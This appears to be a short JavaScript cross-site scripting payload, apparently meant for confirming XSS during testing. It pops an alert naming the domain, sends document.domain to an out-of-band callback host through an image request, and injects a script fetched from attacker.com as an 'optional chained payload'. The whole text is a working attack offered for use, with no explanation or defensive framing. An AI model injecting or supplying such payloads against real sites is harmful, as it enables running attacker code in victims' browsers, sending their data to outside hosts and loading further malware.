alert("✅ XSS Confirmed: " + document.domain);
new Image().src = "https://wdnjvosjkyhkfsmxvovxoq4wsvswtm3id.oast.fun/?x=" + document.domain;


// You can optionally load another script dynamically too:
var s = document.createElement('script');
s.src = "https://attacker.com/evil.js"; // optional chained payload
document.body.appendChild(s);
